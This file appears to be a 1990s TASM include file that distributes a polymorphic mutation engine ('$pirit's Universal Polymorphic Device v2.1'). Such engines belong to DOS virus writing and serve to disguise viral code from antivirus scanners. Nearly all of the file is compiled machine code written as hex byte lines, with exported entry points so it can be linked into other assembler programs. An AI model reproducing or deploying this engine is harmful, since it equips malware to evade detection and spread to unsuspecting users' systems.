;--------------------- Welcome-to -----------------------;
; [$UPD�2.1], $pirit's Universal Polymorphic Device v2.1 ;
;           (C)1995-1996 by �Nigh��$piri��		 ;
;--------------------------------------------------------;
; This file you can include in your assembler sourses    ;
; (with TASM pseudo-operator "include") if you don't	 ;
; want to use object module				 ;
;--------------------------------------------------------;

; *** Don't change here nothing!

; public	$UPD,FullRandom,Random,BRandom,Boolean
; public	$UPD_Bottom,$UPD_Top

$UPD_Bottom	=	$

		db	05Bh,024h,055h,050h,044h,0FBh,032h,02Eh,031h
		db	05Dh,02Ch,020h,024h,070h,069h,072h,069h,074h
		db	027h,073h,020h,055h,06Eh,069h,076h,065h,072h
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		db	000h,000h
FullRandom:
		db	033h,0C0h,048h,0EBh,003h
Boolean:
		db	0B8h,001h,000h
Random:
		db	053h,051h,052h,050h,0E8h,000h,000h,05Bh
		db	081h,0EBh,087h,003h,02Bh,0C0h,0CDh,01Ah,0E4h
		db	040h,091h,092h,08Dh,09Fh,0BBh,003h,031h,007h
		db	0D3h,007h,033h,00Fh,0D3h,0C0h,033h,017h,0D3h
		db	0CAh,033h,0C2h,0F7h,0EAh,033h,0C2h,031h,007h
		db	059h,02Bh,0D2h,041h,074h,003h,0F7h,0F1h,092h
		db	05Ah,059h,05Bh,085h,0C0h,0C3h,000h,000h
BRandom:
		db	032h
		db	0E4h,0EBh,0BFh,0E8h,004h,000h,0E8h,040h,000h
		db	0C3h,057h,081h,0C7h,04Ch,004h,0AAh,05Fh,0AAh
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		db	059h,05Eh,0C3h
$UPD:
		db	09Ch,050h,053h,052h,057h,056h
		db	055h,0FCh,0E8h,000h,000h,05Bh,081h,0EBh,04Eh
		db	00Eh,088h,0A7h,0F8h,002h,0E8h,016h,000h,0E8h
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		db	0C3h

$UPD_Top	=	$
